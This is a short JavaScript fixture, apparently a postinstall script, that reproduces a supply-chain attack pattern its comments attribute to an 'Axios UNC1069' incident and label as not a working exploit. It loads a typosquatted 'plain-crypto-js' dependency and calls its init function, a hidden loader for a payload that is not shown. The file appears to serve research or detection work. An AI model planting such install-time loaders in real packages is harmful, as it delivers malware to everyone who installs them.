// Axios UNC1069 (March 2026) pattern reproduction — NOT a working exploit.
// Postinstall loads a typosquat'd sub-dependency, which contains the real payload.
// The wrapper package itself looks innocuous on review; only the dep manifest matters.

try {
  const crypt = require('plain-crypto-js');
  if (crypt && typeof crypt.init === 'function') {
    crypt.init();
  }
} catch (_) {
  // sub-dep not installed in this fixture; payload would run if installed live
}
